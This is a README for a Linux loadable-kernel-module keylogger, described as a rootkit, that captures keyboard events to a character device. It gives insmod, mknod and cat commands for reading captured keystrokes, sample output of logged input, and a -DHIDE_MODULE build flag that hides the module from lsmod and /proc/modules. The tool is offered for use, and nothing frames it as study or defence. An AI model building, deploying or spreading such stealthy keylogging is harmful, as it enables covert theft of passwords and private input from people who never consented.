# Keylog

A stealthy Linux kernel-based keylogger that hides itself from `lsmod` and
`/proc/modules`.

## Usage
This rootkit is in the form of a loadable kernel module. It receives keyboard
events from the kernel and outputs to a character device. Install using
`insmod`:

```console
$ insmod keylog
$ dmesg | tail -n1
[  498.484687] keylog: Registered device major number 249
$ mknod chrdev0 c 249 0  # create a character device, 249 is the major no.
$ cat chrdev0
dmesg | tail -n1
mknod chrdev0 c 249 0
cat chrdev0
```

## Build
Make sure you have `linux-headers` installed.

```console
$ make
```

To hide the module from kernel, compile with `-DHIDE_MODULE`. You can also
change the buffer size `BUFLEN` that is used to store key events. By default it
is 1024 bytes.

```console
$ KCPPFLAGS="-DHIDE_MODULE -DBUFLEN=2048" make
```

## Development
A Vagrant box with essential tools/packages is provided. Simply run the
following commands to build the box:

```console
$ vagrant up
$ vagrant ssh
vagrant@stretch:~$ cd /vagrant
```
